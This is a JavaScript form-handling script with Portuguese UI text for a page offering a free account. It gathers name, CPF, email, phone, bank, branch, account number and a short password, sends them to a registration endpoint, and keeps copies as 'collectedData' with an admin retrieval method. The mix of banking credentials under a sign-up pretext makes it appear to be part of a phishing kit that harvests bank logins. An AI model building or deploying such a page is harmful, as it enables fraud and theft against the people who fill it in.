// Form handling and data submission

class FormHandler {
    constructor() {
        this.form = document.getElementById('registration-form');
        this.successMessage = document.getElementById('success-message');
        this.initialize();
    }
    
    initialize() {
        if (this.form) {
            this.form.addEventListener('submit', this.handleSubmit.bind(this));
        }
    }
    
    async handleSubmit(event) {
        event.preventDefault();
        
        if (!this.validateForm()) {
            return;
        }
        
        const formData = this.collectFormData();
        const result = await this.submitData(formData);
        
        if (result && result.status === 'success') {
            this.showSuccessMessage();
            this.resetForm();
            
            // Redirect to login after 3 seconds
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 3000);
        }
    }
    
    collectFormData() {
        return {
            nome: document.getElementById('nome').value,
            cpf: document.getElementById('cpf').value.replace(/\D/g, ''),
            email: document.getElementById('email').value,
            telefone: document.getElementById('telefone').value.replace(/\D/g, ''),
            banco: document.getElementById('banco').value,
            agencia: document.getElementById('agencia').value.replace(/\D/g, ''),
            conta: document.getElementById('conta').value.replace(/\D/g, ''),
            senha: document.getElementById('senha').value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: 'awaiting_server_fetch' // Will be filled by server
        };
    }
    
    validateForm() {
        const senha = document.getElementById('senha').value;
        const confirmarSenha = document.getElementById('confirmar-senha').value;
        
        if (senha !== confirmarSenha) {
            alert('As senhas não coincidem. Por favor, verifique.');
            return false;
        }
        
        if (senha.length < 4) {
            alert('A senha deve ter pelo menos 4 caracteres.');
            return false;
        }
        
        return true;
    }
    
    async submitData(data) {
        try {
            // Send registration data to server
            const response = await apiRequest('/api/register', {
                method: 'POST',
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error('Erro ao enviar dados');
            }
            
            const result = await response.json();
            console.log('Dados enviados com sucesso:', data);
            return result;
            
        } catch (error) {
            console.error('Erro ao enviar dados:', error);
            alert('Erro ao criar conta. Verifique se o servidor está rodando.');
            // Fallback: save to localStorage for demo purposes
            this.saveToLocalStorage(data);
            throw error;
        }
    }
    
    saveToLocalStorage(data) {
        try {
            const existingData = JSON.parse(localStorage.getItem('collectedData') || '[]');
            existingData.push(data);
            localStorage.setItem('collectedData', JSON.stringify(existingData));
            console.log('Dados salvos localmente:', data);
        } catch (error) {
            console.error('Erro ao salvar localmente:', error);
        }
    }
    
    showSuccessMessage() {
        if (this.successMessage) {
            this.successMessage.style.display = 'block';
            this.successMessage.scrollIntoView({ behavior: 'smooth' });
        }
    }
    
    resetForm() {
        if (this.form) {
            this.form.reset();
            
            // Reset submit button
            const submitBtn = this.form.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.classList.remove('loading');
                submitBtn.innerHTML = 'Criar Conta Gratuita';
            }
        }
    }
    
    // Method to retrieve collected data (for admin purposes)
    static getCollectedData() {
        try {
            return JSON.parse(localStorage.getItem('collectedData') || '[]');
        } catch (error) {
            console.error('Erro ao recuperar dados:', error);
            return [];
        }
    }
    
    // Method to clear collected data (for testing)
    static clearCollectedData() {
        localStorage.removeItem('collectedData');
    }
}

// Initialize form handler when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    new FormHandler();
});